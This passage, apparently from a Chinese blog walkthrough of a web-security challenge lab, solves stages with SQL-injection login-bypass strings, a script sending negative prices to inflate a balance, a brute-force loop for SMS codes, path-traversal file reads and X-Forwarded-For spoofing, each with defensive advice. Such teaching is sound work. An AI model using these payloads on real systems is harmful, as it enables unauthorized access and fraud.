rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png</a>)</p>\n<h3 id=\"3-揭密\"><a href=\"#3-揭密\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>用户名密码直接写在了页面的js逻辑里，跟随页面元素js操作即可找到对应的内容。<br>![关卡1-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png</a>)<br>![关卡1-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png</a>)<br>![关卡1-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png</a>)<br>![关卡1-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png</a>)</p>\n<p>由此，可见第一关的用户名密码如下：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> stage1Username = <span class=\"string\">\"stage1_user\"</span>;</div><div class=\"line\"><span class=\"keyword\">var</span> state1Password = <span class=\"string\">\"tHis1Is3aSim3p#ab$\"</span>;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-小结\"><a href=\"#4-小结\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>一般不会出现此类小白程序员的情况。</p>\n<h2 id=\"0x02-关卡2\"><a href=\"#0x02-关卡2\" class=\"headerlink\" title=\"0x02 关卡2\"></a>0x02 关卡2</h2><p>这是一道SQL注入题。</p>\n<p>SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p>\n<h3 id=\"1-提示-1\"><a href=\"#1-提示-1\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：本题没有可登入的用户名密码，请绕过登录验证。<br>Tips：就算是判断了用户名 and 密码 都正确，也是被禁用的。</p>\n</blockquote>\n<h3 id=\"2-界面-1\"><a href=\"#2-界面-1\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡2]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png</a>)<br>![关卡2]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png</a>)</p>\n<h3 id=\"3-揭密-1\"><a href=\"#3-揭密-1\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>对于sql而言，有些特殊字符（如：单引号，–，\\，#等）、保留字（如：select，values，delete等）和内置函数（date，time，concat等），使用不当都有可能会导致SQL执行错误。</p>\n<p>由此，我们尝试使用单引号，发现登录异常提示如下：<br>![特殊字符注入]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png</a>)<br>![特殊字符注入]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png</a>)</p>\n<p>并且，发现在控制台出现如下异常信息：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">StatementCallback; bad SQL grammar [select count(id) from user2 <span class=\"built_in\">where</span> username = <span class=\"string\">''</span><span class=\"string\">' and password = '</span><span class=\"string\">']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '</span><span class=\"string\">''</span><span class=\"string\">' and password = '</span><span class=\"string\">''</span> at line 1</div></pre></td></tr></table></figure></p>\n<p>从异常内容可以发现，出错的SQL内容为：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(<span class=\"keyword\">id</span>) <span class=\"keyword\">from</span> user2 <span class=\"keyword\">where</span> username = <span class=\"string\">''' and password = ''</span></div></pre></td></tr></table></figure></p>\n<p>于是乎就从盲目地注入，变成了有针对性的注入。<br>针对于此，可以填写如下内容进入SQL注入：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">username: \\</div><div class=\"line\">password: or '' = '</div><div class=\"line\"></div><div class=\"line\">username: \\</div><div class=\"line\">password: or 1 != '</div><div class=\"line\"></div><div class=\"line\">username: ' or 1 !=</div><div class=\"line\">password: '--</div><div class=\"line\"></div><div class=\"line\">username: ' or 1 !=</div><div class=\"line\">password: '--</div><div class=\"line\"></div><div class=\"line\">username: ' or 1=1 -- x</div><div class=\"line\">username: ' or 1=1 #</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：答案可以很多。</p>\n<h3 id=\"4-小结-1\"><a href=\"#4-小结-1\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><ul>\n<li>避免出现一些详细的错误消息，异常不要抛出来，在服务器端打印日志用于异常分析就好。</li>\n<li>永远不要使用动态拼装sql，使用数据库或开发框架提供的参数化查询接口。</li>\n<li>机密信息不要直接存放，加密或者hash密码和敏感的信息再存储。</li>\n<li>用户输入过滤：对特殊字符单引号和双”-“等进行转义处理或编码转换。</li>\n<li>SQL注入检测工具进行检测。如：sqlmap、SQLninja等。</li>\n</ul>\n<h3 id=\"5-参考文档\"><a href=\"#5-参考文档\" class=\"headerlink\" title=\"5. 参考文档\"></a>5. 参考文档</h3><ul>\n<li><a href=\"http://php.net/manual/zh/security.database.sql-injection.php\" target=\"_blank\" rel=\"external\">SQL 注入</a></li>\n<li><a href=\"http://baike.baidu.com/view/3896.htm#3\" target=\"_blank\" rel=\"external\">SQL注入技术</a></li>\n<li><a href=\"https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\" target=\"_blank\" rel=\"external\">9.4 避免SQL注入</a></li>\n</ul>\n<h2 id=\"0x03-关卡3\"><a href=\"#0x03-关卡3\" class=\"headerlink\" title=\"0x03 关卡3\"></a>0x03 关卡3</h2><h3 id=\"1-提示-2\"><a href=\"#1-提示-2\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找到通关后台，并将自己的通关数目加一级<br>Tips：答案不在本页</p>\n</blockquote>\n<h3 id=\"2-界面-2\"><a href=\"#2-界面-2\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡3]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png</a>)<br>![关卡3]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png</a>)</p>\n<h3 id=\"3-揭密-2\"><a href=\"#3-揭密-2\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>由提示找到通关后台可知，找到后台是关键。<br>一般地，常规后台命名为admin、admin\\index、manage、dashboard等。</p>\n<p>尝试如下地址：<a href=\"http://localhost:8080/sohu/index#/admin\" target=\"_blank\" rel=\"external\">http://localhost:8080/sohu/index#/admin</a><br>于是进入了后台管理界面，如下图所示：<br>![WEB安全渗透实战-后台管理系统<br>]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>![后台管理系统-升级]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png</a>)<br>![后台管理系统-升级]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png</a>)</p>\n<p>尝试点击<strong>升级</strong>直接通关，其他所有内容其实都是假的。</p>\n<h3 id=\"4-小结-2\"><a href=\"#4-小结-2\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>后台弱口令</p>\n<h2 id=\"0x04-关卡4\"><a href=\"#0x04-关卡4\" class=\"headerlink\" title=\"0x04 关卡4\"></a>0x04 关卡4</h2><p>将非最高价格物品价格修改为负值，从而增加自己的虚拟货币，然后再买最高价格物品。</p>\n<h3 id=\"1-提示-3\"><a href=\"#1-提示-3\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：通过本页面提供的虚拟货币购买价值最高的物品<br>Tips：0 - (-1) = 1</p>\n</blockquote>\n<h3 id=\"2-界面-3\"><a href=\"#2-界面-3\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡4]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png</a>)<br>![关卡4]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png</a>)</p>\n<h3 id=\"3-揭密-3\"><a href=\"#3-揭密-3\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>由于初始时每人只拥有5000000的虚拟货币，完全不只以购买价值最高的物品。<br>因为要购买前需要增加自己的虚拟货币。</p>\n<p>再根据下面的提示说0 - (-1) = 1，可与购买联想到：购买物品时，修改传到后端的价格为负数，来达到为自己增加虚拟货币的目的。</p>\n<p>于是我们尝试购买价格为399的物品。系统提示：购买成功，但是未购买价值最高的物品，如下图所示：<br>![未购买最高价值的物品]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png</a>)<br>![未购买最高价值的物品]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png</a>)</p>\n<p>我们再通过console可以看到，发出的POST请求为：<a href=\"http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399</a></p>\n<p>查看购买的js请求代码如下：<br>![关卡4-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png</a>)<br>![关卡4-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png</a>)</p>\n<p>在下一次购买请求时，设置price值为 -7999999 。请求完成后，依然提示购买失败的消息，但是虚拟货币却变成了：12999600。</p>\n<p>于是，我们就可以开开心心地购买最高价格的物品了。</p>\n<p>完成的js操作如下所示：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 增加虚拟货币</span></div><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=-7999999'</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    method: <span class=\"string\">'post'</span>,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'SUCCESS'</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 购买最高价格物品</span></div><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/stage4/pass?id=3&amp;price=7999999'</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    method: <span class=\"string\">'post'</span>,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'SUCCESS'</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-小结-3\"><a href=\"#4-小结-3\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>虽然做了不能够买比自己持有总金额高的物品的检验，但是未校验物品金额不允许为负数，也未校验id对应的物品金额与实际金额是否相符。<br>对于关键逻辑，对参数做更加严格的校验。</p>\n<h2 id=\"0x05-关卡5\"><a href=\"#0x05-关卡5\" class=\"headerlink\" title=\"0x05 关卡5\"></a>0x05 关卡5</h2><p>暴力破解</p>\n<h3 id=\"1-提示-4\"><a href=\"#1-提示-4\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：通过收到的短信验证码完成手机验证。<br>Tips：有时候采用最原始的方法收到的效果反而更显著。</p>\n</blockquote>\n<h3 id=\"2-界面-4\"><a href=\"#2-界面-4\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡5]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png</a>)<br>![关卡5]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png</a>)</p>\n<h3 id=\"3-揭密-4\"><a href=\"#3-揭密-4\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>从Tips里提到的最原始的方法，大概能猜测到最直接的破解方式：<strong>字典破解</strong> 或 <strong>暴力破解</strong>。<br>要么验证码是个弱密码，要么验证码很方便枚举出来。</p>\n<p>接下来，点击“获取短信验证码”，提示：新的3位数字验证码已经通过短信，发送到13800138000的手机上，请注意查收！<br>因此，可见验证码可以枚举出来，只需要发起不超过1000次请求即可找到验证码。</p>\n<p>看过js请求代码，了解请求构造后，可以使用如下操作暴破：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/sms/code/verfiy'</span>;</div><div class=\"line\"><span class=\"keyword\">var</span> len = <span class=\"number\">1000</span>;</div><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</div><div class=\"line\">\t$.ajax(&#123;</div><div class=\"line\">\t\tmethod: <span class=\"string\">'post'</span>,</div><div class=\"line\">        <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">\t\turl: url + <span class=\"string\">'?phone=13800138000&amp;code='</span> + i,</div><div class=\"line\">\t\tsuccess: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'code:'</span> + i);</div><div class=\"line\">\t\t\t\ti = len;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>暴破完成后，会打印出对应的验证码，之后即可通过dashboard页直接进入下一关。</p>\n<p><strong>注</strong>：考虑验证码可能会补扩散开，因此每次有人过关，验证码就会重新刷新一次。</p>\n<h3 id=\"4-小结-4\"><a href=\"#4-小结-4\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>尽量不要设置容易枚举的密码或验证码。同时，对于敏感信息可以加上一些限制，类似于：时效性限制或者一天内允许尝试失败次数等。</p>\n<h2 id=\"0x06-关卡6\"><a href=\"#0x06-关卡6\" class=\"headerlink\" title=\"0x06 关卡6\"></a>0x06 关卡6</h2><p>读取服务器上的文件</p>\n<h3 id=\"1-提示-5\"><a href=\"#1-提示-5\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找到可以通过本关的密码并提交。<br>Tips：密码被硬编码到了当前页面服务器上的php代码里。</p>\n</blockquote>\n<h3 id=\"2-界面-5\"><a href=\"#2-界面-5\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡6]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png</a>)<br>![关卡6]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png</a>)</p>\n<h3 id=\"3-揭密-5\"><a href=\"#3-揭密-5\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>老规范，查看页面代码，如下图所示：<br>![关卡6-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png</a>)<br>![关卡6-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png</a>)</p>\n<p>再结合Tips说密码被放在了php代码里。巧的是页面里的图片也是通过后缀为php的url生成的。<br>由此可知，这个php页面就是stage6.php。如此同时，这个服务还支持file参数。</p>\n<p>于是，可以尝试设file值为../stage6.php、stage6.php、sohu/stage6.php、../sohu/stage6.php等等获取php代码内容。</p>\n<p>最后发现该php代码文件获取链接地址为：<a href=\"http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php</a></p>\n<p>查看页面内容如下图所示：<br>![关卡6-php代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png</a>)<br>![关卡6-php代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png</a>)</p>\n<p>额，其实这是一个jsp页面，只是以jsp为后缀的url被jetty使用默认的servlet自动转发了，不得以只好用php做为后缀用了。</p>\n<p>总之，最后能获取到了密码为：sATa3HGe6</p>\n<h3 id=\"4-小结-5\"><a href=\"#4-小结-5\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>不要以实际文件路径为文件请求参数。<br>如果服务需要的文件可枚举，则可以在后端限制可获取文件范围；或者把所有需要的文件放置于一个特定目标，只允许访问通过服务获取此目标下的文件。</p>\n<h2 id=\"0x07-关卡7\"><a href=\"#0x07-关卡7\" class=\"headerlink\" title=\"0x07 关卡7\"></a>0x07 关卡7</h2><p>伪造ip地址</p>\n<h3 id=\"1-提示-6\"><a href=\"#1-提示-6\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：请获得本页面的访问权限<br>Tips：一会公开的来源控制方法也许并不安全</p>\n</blockquote>\n<h3 id=\"2-界面-6\"><a href=\"#2-界面-6\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡7]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png</a>)<br>![关卡7]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png</a>)</p>\n<h3 id=\"3-揭密-6\"><a href=\"#3-揭密-6\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>点击“验证权限”发现系统给出如下提示：<br>![关卡7-提示]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png</a>)<br>![关卡7-提示]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png</a>)</p>\n<p>提示内容：你不是来自于127.0.0.1的访客。反过来，提示的意思可以理解为只有IP地址来自于127.0.0.1的用户才有访问的权限。</p>\n<p>于是则需要伪造请求ip地址为127.0.0.1。<br>一般地，涉及到ip地址的请求头有：X-Real-IP、X-Forwarded-For、Host。<br>伪造ip时，一一尝试，最终发现设置 X-Forwarded-For 为127.0.0.1 成功通关。</p>\n<h3 id=\"4-补充内容\"><a href=\"#4-补充内容\" class=\"headerlink\" title=\"4. 补充内容\"></a>4. 补充内容</h3><h4 id=\"请求头信息修改工具\"><a href=\"#请求头信息修改工具\" class=\"headerlink\" title=\"请求头信息修改工具\"></a>请求头信息修改工具</h4><p>使用chrome插件工具ModHeader来修改请求头信息：<a href=\"https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj\" target=\"_blank\" rel=\"external\">https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj</a></p>\n<h4 id=\"客户端IP流转\"><a href=\"#客户端IP流转\" class=\"headerlink\" title=\"客户端IP流转\"></a>客户端IP流转</h4><p>服务器经过Apache,Squid等反向代理软件层层代理转发后，其原始IP地址可能会丢失。</p>\n<p>服务器通过<code>request.getRemoteAddr();</code>只能获取直接请求的ip地址。<br>对于服务器之上架设有代理服务器的，则是代理服务器的ip地址；对于用户直接访问服务器，中间并没有代理服务器的情况，获取的ip地址才是用户真正的ip地址。</p>\n<p>对于服务器代理产生的ip丢失情况，一些反射代理服务器开始引入X-Forwarded-For和X-Real-IP等非正式的http协议头，用于保存原始客户端的ip地址。</p>\n<p>一般地，服务器程序会优先从X-Forwarded-For和X-Real-IP二个协议头里取ip地址，没有再从request里取ip地址。<br><strong>注</strong>：CRM后端代码还是额外check Proxy-Client-IP和WL-Proxy-Client-IP协议头。</p>\n<p>参考：<a href=\"http://www.cnblogs.com/ITtangtang/p/3927768.html\" target=\"_blank\" rel=\"external\">Java获取客户端IP</a></p>\n<h3 id=\"5-小结\"><a href=\"#5-小结\" class=\"headerlink\" title=\"5. 小结\"></a>5. 小结</h3><p>大家通用的客户端ip地址获取方法，经过代理服务器转发后，并不一定可靠。<br>因此，使用ip来做权限上的限制也并不是100%安全的。</p>\n<h2 id=\"0x08-关卡8\"><a href=\"#0x08-关卡8\" class=\"headerlink\" title=\"0x08 关卡8\"></a>0x08 关卡8</h2><h3 id=\"1-准备\"><a href=\"#1-准备\" class=\"headerlink\" title=\"1. 准备\"></a>1. 准备</h3><h4 id=\"二维码生成\"><a href=\"#二维码生成\" class=\"headerlink\" title=\"二维码生成\"></a>二维码生成</h4><p>生成二维码工具：</p>\n<ul>\n<li><a href=\"http://cli.im/\" target=\"_blank\" rel=\"external\">http://cli.im/</a></li>\n<li><a href=\"http://liantu.com/\" target=\"_blank\" rel=\"external\">http://liantu.com/</a></li>\n</ul>\n<p>生成内容：<br><a href=\"http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933</a></p>\n<h4 id=\"二维码解码\"><a href=\"#二维码解码\" class=\"headerlink\" title=\"二维码解码\"></a>二维码解码</h4><p>推荐使用：<a href=\"http://tool.oschina.net/qr?type=2\" target=\"_blank\" rel=\"external\">http://tool.oschina.net/qr?type=2</a><br>试过其他的几个不能解码中间有logo图片的二维码。</p>\n<h3 id=\"2-提示\"><a href=\"#2-提示\" class=\"headerlink\" title=\"2. 提示\"></a>2. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：请主动设置你的过关级别为8<br>Tips：你猜到他们猜不到你猜得到他们猜不到你猜得到</p>\n</blockquote>\n<h3 